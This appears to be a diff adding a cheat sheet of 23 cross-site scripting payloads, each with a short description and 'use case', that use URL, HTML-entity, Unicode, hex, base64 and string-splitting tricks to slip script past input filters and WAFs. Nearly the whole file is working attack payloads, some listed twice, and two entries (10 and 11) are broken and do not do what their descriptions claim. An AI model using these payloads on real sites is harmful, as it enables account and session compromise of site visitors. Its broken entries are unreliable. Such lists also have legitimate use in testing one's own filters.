@@ -1,0 +1,145 @@
+# XSS Encoding & Obfuscation Payloads
+
+# Purpose:
+# These payloads demonstrate how encoding and obfuscation techniques
+# can bypass weak input filters and WAFs.
+
+----------------------------------------
+# 1. HTML Entity Encoding
+Payload: &lt;script&gt;alert(1)&lt;/script&gt;
+Description: Encodes special HTML characters.
+Use Case: Works when input is decoded before rendering.
+
+----------------------------------------
+# 2. URL Encoding
+Payload: %3Cscript%3Ealert(1)%3C%2Fscript%3E
+Description: URL-encoded script payload.
+Use Case: Used in GET/POST parameters.
+
+----------------------------------------
+# 3. Double URL Encoding
+Payload: %253Cscript%253Ealert(1)%253C%252Fscript%253E
+Description: Encoded twice.
+Use Case: Bypasses filters decoding only once.
+
+----------------------------------------
+# 4. Unicode Encoding
+Payload: \u003cscript\u003ealert(1)\u003c/script\u003e
+Description: Uses Unicode escape sequences.
+Use Case: Bypass JavaScript-based filters.
+
+----------------------------------------
+# 5. Hex Encoding
+Payload: <script>alert('\x58\x53\x53')</script>
+Description: Encodes characters in hex.
+Use Case: Avoid keyword detection.
+
+----------------------------------------
+# 6. Base64 Encoding
+Payload: <script>eval(atob('YWxlcnQoMSk='))</script>
+Description: Encoded payload decoded at runtime.
+Use Case: Bypass filters blocking "alert" or "script".
+
+----------------------------------------
+# 7. Mixed Encoding
+Payload: %3Cscript%3Ealert('\x58\x53\x53')%3C/script%3E
+Description: Combines URL + Hex encoding.
+Use Case: Bypass layered filters.
+
+----------------------------------------
+# 8. HTML Decimal Encoding
+Payload: &#60;script&#62;alert(1)&#60;/script&#62;
+Description: Uses decimal HTML entities.
+Use Case: Bypass simple HTML filters.
+
+----------------------------------------
+# 9. HTML Hex Encoding
+Payload: &#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+Description: Uses hex HTML entities.
+Use Case: Similar to decimal encoding bypass.
+
+----------------------------------------
+# 10. Obfuscated Script
+Payload: <script>window</script>
+Description: Breaks keyword detection.
+Use Case: Bypass filters blocking "alert".
+
+----------------------------------------
+# 11. String Concatenation
+Payload: <script>var a='al'+'ert';window</script>
+Description: Builds function name dynamically.
+Use Case: Avoid signature-based detection.
+
+----------------------------------------
+# 12. Whitespace Obfuscation
+Payload: <script > alert ( 1 ) </script >
+Description: Adds extra spaces.
+Use Case: Bypass strict pattern matching.
+
+-------------------------------------------------------------
+13. URL Encoded Script
+Payload: %3Cscript%3Ealert(1)%3C%2Fscript%3E
+Description: Script tag encoded in URL format.
+Use Case: Works when server decodes input before rendering.
+
+----------------------------------------
+14. HTML Entity Encoding
+Payload: &lt;script&gt;alert(1)&lt;/script&gt;
+Description: Uses HTML entities for special characters.
+Use Case: Bypass filters that miss encoded HTML.
+
+----------------------------------------
+15. HTML Hex Encoding
+Payload: &#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+Description: Encodes characters using hex entities.
+Use Case: Alternative to decimal encoding.
+
+----------------------------------------
+16. Attribute Break + Encoded
+Payload: %22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+Description: Breaks attribute (") then injects encoded script.
+Use Case: Input inside HTML attributes.
+
+----------------------------------------
+17. Unicode Encoding
+Payload: \u003cscript\u003ealert(1)\u003c/script\u003e
+Description: Unicode escaped characters.
+Use Case: Bypass JS-based sanitization.
+
+----------------------------------------
+18. Hex Escape Encoding
+Payload: \x3cscript\x3ealert(1)\x3c/script\x3e
+Description: Hex-encoded characters.
+Use Case: Avoid keyword-based filters.
+
+----------------------------------------
+19. Double URL Encoding
+Payload: %253Cscript%253Ealert(1)%253C%252Fscript%253E
+Description: Encoded twice.
+Use Case: Bypass filters decoding only once.
+
+----------------------------------------
+20. Parenthesis Encoding
+Payload: &lpar;alert&rpar;(1)
+Description: Encodes parentheses.
+Use Case: Bypass filters blocking "(" and ")".
+
+----------------------------------------
+21. Encoded JavaScript URI
+Payload: <a href="&#106;avascript:alert(1)">Click</a>
+Description: Encodes "javascript:" prefix.
+Use Case: Bypass keyword-based blocking.
+
+----------------------------------------
+22. Colon Encoding
+Payload: <a href="javascript&colon;alert(1)">Click</a>
+Description: Encodes colon in javascript URI.
+Use Case: Bypass strict URI filters.
+
+----------------------------------------
+23. Decimal Encoding (Event Handler)
+Payload: <img src=x onerror=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000049&#0000041>
+Description: Fully encoded "javascript:alert(1)".
+Use Case: Bypass strong keyword detection filters.
+
+----------------------------------------
